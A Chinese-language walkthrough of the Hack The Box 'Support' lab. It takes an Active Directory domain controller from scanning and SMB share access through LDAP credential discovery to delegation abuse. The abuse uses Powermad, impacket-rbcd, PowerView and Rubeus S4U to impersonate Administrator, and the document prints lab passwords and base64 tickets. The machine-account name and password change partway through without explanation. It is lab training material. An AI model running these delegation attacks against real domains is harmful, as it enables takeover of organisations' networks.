---
layout: post
title: HTB——Support
---

![Alt text](https://github.com/Jackie1732/Jackie1732.github.io/blob/main/pictures/Support/01.png?raw=true)

# 0x01 信息收集

---

老规矩`Tscan`+`Fscan`

```bash
 _____                             ___  _             
/__   \ ___   ___   __ _  _ __    / _ \| | _   _  ___ 
  / /\// __| / __| / _' || '_ \  / /_)/| || | | |/ __|
 / /   \__ \| (__ | (_| || | | |/ ___/ | || |_| |\__ \
 \/    |___/ \___| \__,_||_| |_|\/     |_| \__,_||___/

https://github.com/TideSec/TscanPlus
TscanClient Version: 2.7.4  NewVersion: 2.7.5  Expired: 2026.01.01
[21:27:47] [INFO] Start IpScan:10.129.230.181
[21:27:47] [INFO] 开始扫描 1 个主机的 65535 个端口，共 65535 个任务

[21:27:49] [+] 10.129.230.181:53 open
[21:27:49] [+] 10.129.230.181:88 open
[21:27:49] [+] 10.129.230.181:139 open
[21:27:49] [+] 10.129.230.181:135 open
[21:27:49] [+] 10.129.230.181:389 open
[21:27:49] [+] 10.129.230.181:464 open
[21:27:49] [+] 10.129.230.181:445 open
[21:27:49] [+] 10.129.230.181:593 open
[21:27:49] [+] 10.129.230.181:636 open
[21:27:49] [+] [TCP/HTTP]  [([\d.]+)$| p 1.0] ncacn-http://10.129.230.181:593 [ncacn_http/1.0]                                                                                      
[21:27:49] [+] [TCP/LDAP]  [Microsoft Windows Active Directory LDAP] 10.129.230.181:389 [0.t.d.k.0.c0.domainFunctionality1.70.forestFunctio]                                        
[21:27:49] [INFO] start LDAP check 10.129.230.181:389
[21:27:49] [+] 开始 LdapScan 任务: LDAP://10.129.230.181:389
[21:27:50] [+] [TCP/NETBIOS]  [Microsoft Windows netbios-ssn] 10.129.230.181:139 [.]
[21:27:50] [+] [TCP/RPC]  [Microsoft Windows RPC] 10.129.230.181:135 [.@]
[21:27:50] [INFO] start WMI check 10.129.230.181:135
[21:27:50] [+] 开始 WmiExec 任务: WMI://10.129.230.181:135
[21:27:54] [+] [TCP/KPASSWD5]   10.129.230.181:464 
[21:27:54] [+] [TCP/MICROSOFT-DS]   10.129.230.181:445 
[21:27:54] [INFO] start SMB check 10.129.230.181:445
[21:27:54] [+] 开始 SmbScan 任务: SMB://10.129.230.181:445
[21:27:56] [+] [TCP/SPARK]  [Apache Spark] 10.129.230.181:88 [.]
[21:27:58] [+] 10.129.230.181:3268 open
[21:27:58] [+] 10.129.230.181:3269 open
[21:28:02] [+] [TCP/LDAP]  [Microsoft Windows Active Directory LDAP] 10.129.230.181:3268 [0.t.d.k.0.c0.domainFunctionality1.70.forestFunctio]                                       
[21:28:02] [INFO] start LDAP check 10.129.230.181:3268
[21:28:02] [+] 开始 LdapScan 任务: LDAP://10.129.230.181:3268
[21:28:10] [+] 10.129.230.181:5985 open
[21:28:17] [+] [TCP/HTTP] [404] [Microsoft-HTTPAPI/2.0][Microsoft HTTPAPI httpd 2.0] http://10.129.230.181:5985 [Not Found]
[21:28:17] [INFO] start WinRM check 10.129.230.181:5985
[21:28:17] [+] 开始 WinRMScan 任务: WinRM://10.129.230.181:5985
[21:28:22] [+] 10.129.230.181:9389 open
[21:28:26] [+] [TCP/ADWS]   10.129.230.181:9389 
[21:30:55] [+] 10.129.230.181:49664 open
[21:30:55] [+] 10.129.230.181:49678 open
端口扫描  74% [██████████████░░░░░░] (49122/65535) [12s:1s][21:30:55] [+] 10.129.230.181:49684 open
[21:30:55] [+] 10.129.230.181:49668 open
[21:30:55] [+] 10.129.230.181:49707 open                   
[21:30:55] [+] 10.129.230.181:49745 open
[21:30:55] [+] [TCP/HTTP]  [([\d.]+)$| p 1.0] ncacn-http://10.129.230.181:49678 [ncacn_http/1.0]                                                                                    
[21:31:13] [+] [TCP/UNKNOWN]   10.129.230.181:49664 
[21:31:14] [+] [TCP/UNKNOWN]   10.129.230.181:49745 
[21:31:14] [+] [TCP/UNKNOWN]   10.129.230.181:49668 
[21:31:14] [+] [TCP/UNKNOWN]   10.129.230.181:49684 
[21:31:14] [+] [TCP/UNKNOWN]   10.129.230.181:49707 
                                                           
[21:31:55] [+] alive ports is: 19
[21:31:55] [+] Ip扫描结束:10.129.230.181
[21:31:55] [INFO] Start UrlScan:http://10.129.230.181:5985
[21:31:55] [+] [TCP/HTTP] [404] [Microsoft-HTTPAPI/2.0] http://10.129.230.181:5985 [Not Found]                                                                                      
                                                 
[21:31:55] [+] Url扫描结束:http://10.129.230.181:5985
[21:31:56] [+] 项目任务完成:Default, Timeuse：249.05016315
[21:31:56] [+] 扫描结束,耗时: 4m10.327276673s
```

```bash
┌──────────────────────────────────────────────┐
│    ___                              _        │
│   / _ \     ___  ___ _ __ __ _  ___| | __    │
│  / /_\/____/ __|/ __| '__/ _` |/ __| |/ /    │
│ / /_\\_____\__ \ (__| | | (_| | (__|   <     │
│ \____/     |___/\___|_|  \__,_|\___|_|\_\    │
└──────────────────────────────────────────────┘
      Fscan Version: 2.0.0

[2025-04-01 21:34:44] [INFO] 暴力破解线程数: 1
[2025-04-01 21:34:44] [INFO] 开始信息扫描
[2025-04-01 21:34:44] [INFO] 最终有效主机数量: 1
[2025-04-01 21:34:44] [INFO] 开始主机扫描
[2025-04-01 21:34:44] [INFO] 有效端口数量: 233
[2025-04-01 21:34:44] [SUCCESS] 端口开放 10.129.230.181:88
[2025-04-01 21:34:44] [SUCCESS] 端口开放 10.129.230.181:389
[2025-04-01 21:34:44] [SUCCESS] 端口开放 10.129.230.181:139
[2025-04-01 21:34:44] [SUCCESS] 端口开放 10.129.230.181:445
[2025-04-01 21:34:44] [SUCCESS] 端口开放 10.129.230.181:135
[2025-04-01 21:34:49] [SUCCESS] 服务识别 10.129.230.181:88 => 
[2025-04-01 21:34:50] [SUCCESS] 服务识别 10.129.230.181:139 =>  Banner:[.]
[2025-04-01 21:34:50] [SUCCESS] 服务识别 10.129.230.181:445 => 
[2025-04-01 21:34:50] [SUCCESS] 服务识别 10.129.230.181:389 => 
[2025-04-01 21:35:50] [SUCCESS] 服务识别 10.129.230.181:135 => 
[2025-04-01 21:35:50] [INFO] 存活端口数量: 5
[2025-04-01 21:35:50] [INFO] 开始漏洞扫描
[2025-04-01 21:35:50] [INFO] 加载的插件: findnet, ldap, ms17010, netbios, smb, smb2, smbghost, webpoc, webtitle                                                                     
[2025-04-01 21:35:50] [SUCCESS] NetInfo 扫描结果
目标主机: 10.129.230.181                                                                  
主机名: dc                                                                                
发现的网络接口:                                                                           
   IPv4地址:                                                                              
      └─ 10.129.230.181                                                                   
[2025-04-01 21:36:25] [INFO] SMB2共享信息 10.129.230.181:445 admin Pass:123456 共享:[ADMIN$ C$ IPC$ NETLOGON support-tools SYSVOL]                                                  
[2025-04-01 21:36:31] [SUCCESS] SMB认证成功 10.129.230.181:445 admin:123456
```

---

# 0x02 SMB服务+.NET逆向

爆出了SMB服务弱口令账密，那我们尝试使用SMB服务看一下共享目录

```bash
┌──(root㉿kali)-[/home/kali/penetration]
└─# smbclient -L //10.129.230.181 -N                

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        support-tools   Disk      support staff tools
        SYSVOL          Disk      Logon server share 
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.129.230.181 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

已知SMB上有此六个共享目录，且`support-tools`是唯一一个非默认的共享目录。我们使用上面爆破出的`admin:123456`去尝试访问此文件夹看看。

```bash
┌──(root㉿kali)-[/home/kali/penetration]
└─# smbclient //10.129.230.181/support-tools -U admin
Password for [WORKGROUP\admin]:
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Wed Jul 20 13:01:06 2022
  ..                                  D        0  Sat May 28 07:18:25 2022
  7-ZipPortable_21.07.paf.exe         A  2880728  Sat May 28 07:19:19 2022
  npp.8.4.1.portable.x64.zip          A  5439245  Sat May 28 07:19:55 2022
  putty.exe                           A  1273576  Sat May 28 07:20:06 2022
  SysinternalsSuite.zip               A 48102161  Sat May 28 07:19:31 2022
  UserInfo.exe.zip                    A   277499  Wed Jul 20 13:01:07 2022
  windirstat1_1_2_setup.exe           A    79171  Sat May 28 07:20:17 2022
  WiresharkPortable64_3.6.5.paf.exe      A 44398000  Sat May 28 07:19:43 2022

                4026367 blocks of size 4096. 970576 blocks available
```

薅下来一个`UserInfo.exe`，我们解压后查看该exe的逻辑，发现其会自动与`support.htb`通信并进行LDAP认证。在Windows主机配置代理后我们运行此exe获取一下域内的用户列表。

```cmd
PS S:\tools\渗透\HTB\Support\UserInfo.exe> .\UserInfo.exe -v find -first '*'
[*] LDAP query to use: (givenName=*)
[+] Found 15 results:
       raven.clifton
       anderson.damian
       monroe.david
       cromwell.gerard
       west.laura
       levine.leopoldo
       langley.lucy
       daughtler.mabel
       bardot.mary
       stoll.rachelle
       thomas.raphael
       smith.rosario
       wilson.shelby
       hernandez.stanley
       ford.victoria
```

但是这些账户并没有实际作用。Re手的进度比较慢，先看WriteUp假装我们获取到了`LDAP`服务密码`nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz`.使用此凭证看一下`LDAP`内的共享信息。在前面Re的过程中我们可以得知此密码是`support`账户下的LDAP服务密码，所以我们可以借此LDAP服务获取support机器密码，而域内用户我们在之前已经全部得到了，可以用来打密码喷洒。注意LDAP服务中的Info字段会存储此账户的密码。

```bash
┌──(root㉿kali)-[/home/kali]
└─# ldapsearch -H ldap://10.129.230.181 -D support\\ldap -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -b 'CN=Users,DC=support,DC=htb' | grep info
 298939 for more information.
info: Ironside47pleasure40Watchful
```

喷洒一下，结果没有惊喜，只有support账户匹配此密码，我们没有拿到额外的账户。

```bash
┌──(root㉿kali)-[/home/kali/HTB/Support]
└─# crackmapexec winrm 10.129.230.181 -u user.txt -p 'Ironside47pleasure40Watchful' --continue-on-success
SMB         10.129.230.181  5985   DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:support.htb)
HTTP        10.129.230.181  5985   DC               [*] http://10.129.230.181:5985/wsman
WINRM       10.129.230.181  5985   DC               [+] support.htb\support:Ironside47pleasure40Watchful (Pwn3d!)
```

![Alt text](https://github.com/Jackie1732/Jackie1732.github.io/blob/main/pictures/Support/02.png?raw=true)

---

# 0x03 域内结构分析——RBCD

拿到`user.txt`，我们根据HTB提示转去使用`bloodhound-python`收集域内信息，观察域结构。

![Alt text](https://github.com/Jackie1732/Jackie1732.github.io/blob/main/pictures/Support/03.png?raw=true)

support账户属于`Shared Support Accounts`组，对`DC`机器账户具有`GenericAll`权限。既然拥有完全访问权限，我们就可以对此`DC`机器账户设置委派属性，创建新用户来打`RBCD`.太久没打约束委派了，都不太会打了。

- [基于资源的约束委派（RBCD） - seizer-zyx - 博客园](https://www.cnblogs.com/seizer/p/18003119)

首先我们需要创建一个机器账户便于后面设置委派属性。这里`impacket-addcomputer`不太好用，我们使用`Powermad.ps1`脚本完成此行为。

```powershell
*Evil-WinRM* PS C:\Users\support\Documents> dir


    Directory: C:\Users\support\Documents


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----          4/1/2025   8:48 PM         135586 Powermad.ps1
-a----          4/1/2025   8:49 PM         770279 PowerView.ps1


*Evil-WinRM* PS C:\Users\support\Documents> Import-Module .\Powermad.ps1
*Evil-WinRM* PS C:\Users\support\Documents> New-MachineAccount -MachineAccount gailo -Password $(ConvertTo-SecureString "password!@#45" -AsPlainText -Force)
[+] Machine account gailo added
```

接下来使用`impacket`设置委派属性。

```bash
┌──(root㉿kali)-[/home/kali/HTB/Support]
└─# impacket-rbcd 'support.htb/support:Ironside47pleasure40Watchful' -dc-ip 10.129.230.181 -action write -delegate-to 'DC$' -delegate-from 'gailo$'
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty
[*] Delegation rights modified successfully!
[*] gailo$ can now impersonate users on DC$ via S4U2Proxy
[*] Accounts allowed to act on behalf of other identity:
[*]     gailo$       (S-1-5-21-1677581083-3380853377-188903654-6101)
```

直接返回了`gailo$`的SID，我们就不需要使用`PowerView`自行查询此账户的SID了。接下来设置DC机器账户的委派属性。

```powershell
┌──(root㉿kali)-[/home/kali/HTB/Support]
└─# evil-winrm -i 10.129.230.181 -u support -p 'Ironside47pleasure40Watchful'
                                        
Evil-WinRM shell v3.7

*Evil-WinRM* PS C:\Users\support\Documents> Import-Module .\PowerView.ps1
*Evil-WinRM* PS C:\Users\support\Documents> $SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-1677581083-3380853377-188903654-6101)"
*Evil-WinRM* PS C:\Users\support\Documents> $SDBytes = New-Object byte[] ($SD.BinaryLength)
*Evil-WinRM* PS C:\Users\support\Documents> $SD.GetBinaryForm($SDBytes, 0)
*Evil-WinRM* PS C:\Users\support\Documents> Get-DomainComputer DC | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes} -Verbose
Verbose: [Get-DomainSearcher] search base: LDAP://DC=support,DC=htb
Verbose: [Get-DomainObject] Extracted domain 'support.htb' from 'CN=DC,OU=Domain Controllers,DC=support,DC=htb'
Verbose: [Get-DomainSearcher] search base: LDAP://DC=support,DC=htb
Verbose: [Get-DomainObject] Get-DomainObject filter string: (&(|(distinguishedname=CN=DC,OU=Domain Controllers,DC=support,DC=htb)))
Verbose: [Set-DomainObject] Setting 'msds-allowedtoactonbehalfofotheridentity' to '1 0 4 128 20 0 0 0 0 0 0 0 0 0 0 0 36 0 0 0 1 2 0 0 0 0 0 5 32 0 0 0 32 2 0 0 2 0 44 0 1 0 0 0 0 0 36 0 255 1 15 0 1 5 0 0 0 0 0 5 21 0 0 0 27 219 253 99 129 186 131 201 230 112 66 11 213 23 0 0' for object 'DC$'
*Evil-WinRM* PS C:\Users\support\Documents> Get-DomainComputer DC -Properties msds-allowedtoactonbehalfofotheridentity

msds-allowedtoactonbehalfofotheridentity
----------------------------------------
{1, 0, 4, 128...}
```

验证委派属性已创建成功了。注意此处需要上传`Rubeus.exe`进行S4U攻击，直接使用外部套件`impacket`进行申请是没有办法申请到的。首先上传`Rubeus.exe`并计算假机器账户的hash值

```powershell
*Evil-WinRM* PS C:\Users\support\Documents> ./Rubeus.exe hash /password:Password123 /user:Lincoke$ /domain:support.htb

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.3.3


[*] Action: Calculate Password Hash(es)

[*] Input password             : Password123
[*] Input username             : Lincoke$
[*] Input domain               : support.htb
[*] Salt                       : SUPPORT.HTBhostlincoke.support.htb
[*]       rc4_hmac             : 58A478135A93AC3BF058A5EA0E8FDB71
[*]       aes128_cts_hmac_sha1 : CF06A85ECE25920715A1D494E5F3C59E
[*]       aes256_cts_hmac_sha1 : FE6D6307D0EA046AA78B7B9D06CF572F04491CBB4974250895BE0C63D5F14F85
[*]       des_cbc_md5          : F15DE664A2646EDF
```

然后我们利用`Rubeus`伪造S4U请求申请CIFS服务，即利用`Lincoke$`的hash去请求白银票据并导入至当前会话

```powershell
*Evil-WinRM* PS C:\Users\support\Documents> ./Rubeus.exe s4u /user:Lincoke$ /rc4:58A478135A93AC3BF058A5EA0E8FDB71 /impersonateuser:Administrator /msdsspn:cifs/dc.support.htb /domain:support.htb /ptt

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.3.3

[*] Action: S4U

[*] Using rc4_hmac hash: 58A478135A93AC3BF058A5EA0E8FDB71
[*] Building AS-REQ (w/ preauth) for: 'support.htb\Lincoke$'
[*] Using domain controller: ::1:88
[+] TGT request successful!
[*] base64(ticket.kirbi):

      doIFXDCCBVigAwIBBaEDAgEWooIEdDCCBHBhggRsMIIEaKADAgEFoQ0bC1NVUFBPUlQuSFRCoiAwHqAD
      AgECoRcwFRsGa3JidGd0GwtzdXBwb3J0Lmh0YqOCBC4wggQqoAMCARKhAwIBAqKCBBwEggQYZScBDQuq
      H6H9k9mvLTg42rRj5cEMgsuffW5p5YjUpibcLaHX4rcVBnTIA62MUFTGhQvgfMNjhlzKxsLJBWd8+Wwy
      7K6rMTXmjxmeywJ2LlBg3TlsO8hlAZfEtT//QmYdN7yV9IcwwbG9rzKGcqm/qml9Z8TvZZDDqwH0aAfq
      p04Jfnf04vr93cmnIAMjh23SrzpjtjAXzd2TJCcMTSKxRvtNj3Y7Mkmlz77E8qQTRkfrEm+uBQsnhOnM
      O1uZZgpRHg9j6pPc9ZFz5XaJh9Ft3V6EXOBfwmBCDh0LfWhqDVkqjHcxu5xiVL5uipgh3IMLS/KEMec4
      uc/N4oFoa+lqxdHp8CY1ls4HPiXYF422agqMllKy8KEjx09A9qvW4yfLMz19nOD6DhDqrCcPbFMDTN1b
      U/qylLRLtMKl0WQYQtDh1MXl714HZNPmUK9Rb8/GrIRkoZQPOQQEAcs8Ur4i4mvlkkwCTL3L9TEu/IQy
      LfViTHJa6v56m2Vss8ycvvdYCiwIL6hPuwMid+OmsRrpl6esUcWsXrowzc6FjIPO7ertIiVNg9+YJUyN
      nwdC0abf/5EqpbQiq2ZPBTDIP07uv3WaeP4Mj9o4NiHKh0dhNclc/iSvj+RtlbCYPmzENqBEg9XKzxbu
      jHOwmd5HDyR5CEp5XDMjHJwiBCQM6FQCxKnjcGgReskTqLrcsSFqPqqm3JvT1NSAvy2eG4/nNOhIKpOH
      swHv5WQKlrzktcB29scjMqiYV0xUCLrM5TfK/Pv/QNKyFi3yROAUiuFatdH/AvZ4qcFTlRaQ7AphV92d
      ac8ZUR1g41zFdugDXOfJNZ2Z32SugbzBXJQBx2rDUakbxpJjcYDUsot+ZgxJp5BqaIBFfDP/KF2OsEbB
      SQyWRwAYkPLxmaOuQnVzne3uxBZOux0Hj9btdtEkIa8vYEyBkvYpwmdv5Mon4W0TLakj1caqpaw4sbe0
      jFpWtjGXzT/F3Nd9MVJ+MmGKz7BuTrcINI/dU6fEIVV9zxtkRUiw6C1aj7Tb84uj3cTeITNJmFOzurF+
      ATdTIFQT6BZvk+WIbs8pl995xZADcnDeqUz0FjF/ee4WaUAW7AC/kjItqo6OS9P5hUwfuvISgifr1AXR
      KJufwhKLXapZsQsrCUdODo1LiivWU9/jrjYVEp0okjAiAU3CeTFoPLlmzTZE1Y6EX8Y4tUuQQ3ImA4gm
      I3aVppJoskEwomiSXREAYVd+U0LEMO9aWZiZKUvLU0vpWyuzfP2hDEdR0hD/ZfmKCnQEYagAWDxuAxri
      xo8n8E+jVRqhmwpGYwb2Rf0/ARdfKkpp+h8Rjjt9TlW3geCDHeFpZk5T5CsaT1T0oJyWDhcOd8X+z0+U
      SqnNYuJzLQQ1HfweCWZSa34I+WTm56OB0zCB0KADAgEAooHIBIHFfYHCMIG/oIG8MIG5MIG2oBswGaAD
      AgEXoRIEENVhays6WSFAQ9qBIP5qEYahDRsLU1VQUE9SVC5IVEKiFTAToAMCAQGhDDAKGwhMaW5jb2tl
      JKMHAwUAQOEAAKURGA8yMDI1MDQwMjA0MzQxMFqmERgPMjAyNTA0MDIxNDM0MTBapxEYDzIwMjUwNDA5
      MDQzNDEwWqgNGwtTVVBQT1JULkhUQqkgMB6gAwIBAqEXMBUbBmtyYnRndBsLc3VwcG9ydC5odGI=


[*] Action: S4U

[*] Building S4U2self request for: 'Lincoke$@SUPPORT.HTB'
[*] Using domain controller: dc.support.htb (::1)
[*] Sending S4U2self request to ::1:88
[+] S4U2self success!
[*] Got a TGS for 'Administrator' to 'Lincoke$@SUPPORT.HTB'
[*] base64(ticket.kirbi):

      doIFpDCCBaCgAwIBBaEDAgEWooIEwjCCBL5hggS6MIIEtqADAgEFoQ0bC1NVUFBPUlQuSFRCohUwE6AD
      AgEBoQwwChsITGluY29rZSSjggSHMIIEg6ADAgEXoQMCAQGiggR1BIIEcb8bj//7mQdhuGU30t6/t1uL
      mkdwoc6tnrOfbMu/18GldN4s06R2mo3G6w97X3eAq+AVq/NwX1PsbgszMMiwg5RRT67Z4J48eaSdYgLh
      6ug8x1fx1aipaqlnRaQTihTXCIb1cjFJpugWb5AF6R+PGtiSjjgSZpz/dGp5Ba5FOjRlj/EY26dN6upO
      3k9txKg+R8G2Ma4qqr2qMlQCezWcC3n5MIE/CQnDmofsZD6vOf5r4IpG8XzRDp1M+rohpvf8iyMQa2Uf
      tqZ7S5RL+2vk6cOOyohy+h1oi4KA3SfT9mhHSzXyBgm3uUu+NEFst+012q8y4/zfS37QSyz76haeb0Rs
      u0qcxRHUFRYhIL4diimYQmsZQMoi7HeNJgCqwP+KRvMPkOYLJDfvJQZ0D0G+8XHY5d10rAGDFVL940G3
      XA7aSJ5l9Y0U8hVRrUQ0VvVO7CmZPRE84yW8Y1cess9YrkO/R5gAcHhpC0WrpUuwUFe41SAGEF0+f8SF
      xT2L80JnQBPZgCaMC8dsfiVXdlpgSKODQg9V08SR88rAGB05y4ER7n02NYirEZAoAikwEd2Ri6IyBFAJ
      3DRm6jHSPZfZUckl4iNPxtVd0m0jkgMQBLU6/QKzcsWH3gpjh/k1VEJCfo+YVPiF9NwypBkGoXYAZ1WP
      cW7achVmeqGe8Z+kouzlfikIgIxpnBRVl5YuThgkqOxH3DjyhB3uqKm/0VtMgw6r8R+cXFmluNxwEOGq
      WpPw9WjVKGHTPKg1sioVahUJJ463n7PzuglFjy/3oAX2R7IQWZizbBtImzCpKdt3etniT/M1ponOrQAb
      dAJnr3k8XqzqaS7Zwp39cv11MC4OJNTokVgI1Znn+7s3BZFxo51yR4sEA0ZlQlMQ7/uP2/7jTPgDRt/8
      MYM9gzmeNseJMZDt4VD48uIiab2wzVhaLeMb1kGisdFj6Iy82p5ZM3bZfBKbJaH1B5BSNAV7QDhh1vku
      wmKjUwt0Q9qkYn2FbSVbXfjIte7XXZdwuiyaDYh8A7AIgcUSx4XaD2aNuu2obwTAR6OyNWVXUtR2V6GB
      fzmWpAn/zisSC+6UBHdhmXmAdQIDaMZIjKKpEbfuGZ/dKdsvJ2Vpfw7WBIiMgwCaqh8eCRc8wnNgxcX4
      4jT87dwHC3onUVpm7ylAx3/ZcVX+h64B5yGT0L5bX5v1Wo8Y1BRYil1AG5i5Js8c0hbTFu1hldCzfBP0
      wjpuuYk3wcGxA3gdWBG8hx6r/tv4Q1uSdEWZVVwlJpFQL5EwwAaQ+X8P0ab8FvBQRvlSsyZmb9sY32cm
      80eFhg/h867MrF1n8E7/1AtBErXqjQfGeOooO2nK9gvPUwEKbGHsmKuBILVRYhHm6j7VtXpJ+TPZYFsO
      ghn2uWG0xtNfR8ECb3EXyrCH+jX4vpTVnRCXawsxQKDI+/MpFABwiy36W1leBmhXwH0qAgAwzeniTQFC
      NF3LPIKOBnFq/6fLEwr7aGpKQ7CDjkKx2znxKIT2/2pv7utij15PYqOBzTCByqADAgEAooHCBIG/fYG8
      MIG5oIG2MIGzMIGwoBswGaADAgEXoRIEEPL+gyy2dn4DJW7OaQZI4DChDRsLU1VQUE9SVC5IVEKiGjAY
      oAMCAQqhETAPGw1BZG1pbmlzdHJhdG9yowcDBQBAoQAApREYDzIwMjUwNDAyMDQzNDEwWqYRGA8yMDI1
      MDQwMjE0MzQxMFqnERgPMjAyNTA0MDkwNDM0MTBaqA0bC1NVUFBPUlQuSFRCqRUwE6ADAgEBoQwwChsI
      TGluY29rZSQ=

[*] Impersonating user 'Administrator' to target SPN 'cifs/dc.support.htb'
[*] Building S4U2proxy request for service: 'cifs/dc.support.htb'
[*] Using domain controller: dc.support.htb (::1)
[*] Sending S4U2proxy request to domain controller ::1:88
[+] S4U2proxy success!
[*] base64(ticket.kirbi) for SPN 'cifs/dc.support.htb':

      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
      Gw5kYy5zdXBwb3J0Lmh0Yg==
[X] Error 1312 running LsaLookupAuthenticationPackage (ProtocalStatus): A specified logon session does not exist. It may already have been terminated
```

我们将最后一段base64薅出来，解码并保存为`kirbi`票据。再使用`impacket`转换为`ccache`票据。

```bash
┌──(root㉿kali)-[/home/kali/HTB/Support]
└─# >....                                                                    
